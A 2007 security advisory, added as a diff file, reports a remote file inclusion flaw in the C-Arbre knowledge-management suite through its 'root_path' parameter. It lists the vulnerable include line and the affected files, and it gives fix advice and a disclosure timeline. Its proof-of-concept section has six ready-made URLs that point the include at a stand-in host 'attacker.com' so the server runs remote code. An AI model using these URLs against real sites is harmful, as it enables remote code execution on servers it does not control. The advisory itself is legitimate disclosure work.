@@ -1,0 +1,115 @@
+____________________   ___ ___ ________
+\_   _____/\_   ___ \ /   |   \\_____  \  
+ |    __)_ /    \  \//    ~    \/   |   \ 
+ |        \\     \___\    Y    /    |    \
+/_______  / \______  /\___|_  /\_______  /
+        \/         \/       \/         \/ 
+
+                                        .OR.ID
+ECHO_ADV_78$2007
+
+-----------------------------------------------------------------------------------------
+[ECHO_ADV_78$2007] C-Arbre <= 0.6PR7 (root_path) Remote File Inclusion Vulnerability
+-----------------------------------------------------------------------------------------
+
+Author         : M.Hasran Addahroni
+Date           : March, 26th 2007
+Location       : Australia, Sydney
+Web            : http://advisories.echo.or.id/adv/adv78-K-159-2007.txt
+Critical Lvl   : Dangerous
+Impact	       : System access
+Where	       : From Remote
+---------------------------------------------------------------------------
+
+Affected software description:
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Application   : C-Arbre  
+version       : <= 0.6PR7
+Vendor        : http://realink.org/
+Download      : http://fresh.t-systems-sfr.com/unix/src/www/c-arbre_0.6PR7_full.tar.gz
+Description :
+
+C-Arbre is an integrated Intranet/Web software suite oriented towards knowledge management. Some of its key features include a CMS, 
+a documents repository, handling of collaborative work and editions, templates engineering, support for DocBook XML, XHTML and Wiki style, permissions and work flow,
+a search engine with full text indexing, logging of actions, a cache system, groupware tools (calendar, Web mail, mailing lists, etc.), 
+automatic generation of a Web portal, and internationalization of the interface.
+
+---------------------------------------------------------------------------
+
+Vulnerability:
+~~~~~~~~~~~~~~
+- Invalid include function at lib/Richtxt_functions.inc.php :  
+  	
+----------------lib/Richtxt_functions.inc.php-------------------
+<?php
+//try to integrate the wikimedia engine functions
+include_once("$root_path/include/Wikitxt_functions.inc.php");
+
+...
+----------------------------------------------------------------
+
+
+Input passed to the "root_path" parameter in lib/Richtxt_functions.inc.php is not properly verified before being used to include files. 
+This can be exploited to include arbitrary files from local or external resources.
+Successful exploitation requires that "register_globals" is enabled.
+
+also affected files :
+lib/adddocfile.php
+lib/auth_check.php
+lib/browse_current_category.inc.php
+lib/docfile_details.php
+lib/main.php
+lib/mainarticle.php
+lib/maindocfile.php
+lib/modify.php
+lib/new.php
+lib/resource_details.php
+lib/smallsearch.php
+mwiki/LocalSettings.php
+
+
+Poc/Exploit:
+~~~~~~~~~~
+
+http://www.target.com/[C-Abre_path]/lib/Richtxt_functions.inc.php?root_path=http://attacker.com/evil?
+http://www.target.com/[C-Abre_path]/lib/adddocfile.php?root_path=http://attacker.com/evil?
+http://www.target.com/[C-Abre_path]/lib/auth_check.php?root_path=http://attacker.com/evil?
+http://www.target.com/[C-Abre_path]/lib/browse_current_category.inc.php?root_path=http://attacker.com/evil?
+http://www.target.com/[C-Abre_path]/lib/docfile_details.php?root_path=http://attacker.com/evil?
+http://www.target.com/[C-Abre_path]/lib/main.php?root_path=http://attacker.com/evil?
+
+
+Solution:
+~~~~~~~
+
+- Edit the source code to ensure that input is properly verified.
+- Turn off register_globals
+
+
+Notification:
+~~~~~~~
+- 19-03-2007 bugs found
+- 26-03-2007 vendor contacted
+- 27-03-2007 advisory released
+---------------------------------------------------------------------------
+
+Shoutz:
+~~~~~
+~ ping - my dearest wife, and my little son, for all the luv the tears n the breath
+~ y3dips,the_day,moby,comex,z3r0byt3,c-a-s-e,S`to,lirva32,negative, str0ke (for the best comments)
+~ masterpop3,maSter-oP,Lieur-Euy,Mr_ny3m,bithedz,murp,an0maly,fleanux,baylaw
+~ SinChan,h4ntu,cow_1seng,sakitjiwa, m_beben, rizal, cR4SH3R, madkid, kuntua, stev_manado, nofry, x16
+~ newbie_hacker@yahoogroups.com
+~ #aikmel #e-c-h-o @irc.dal.net
+
+---------------------------------------------------------------------------
+Contact:
+~~~~~~
+
+     K-159 || echo|staff || eufrato[at]gmail[dot]com
+     Homepage: http://k-159.echo.or.id/
+
+-------------------------------- [ EOF ] ----------------------------------
+
+# milw0rm.com [2007-03-26]
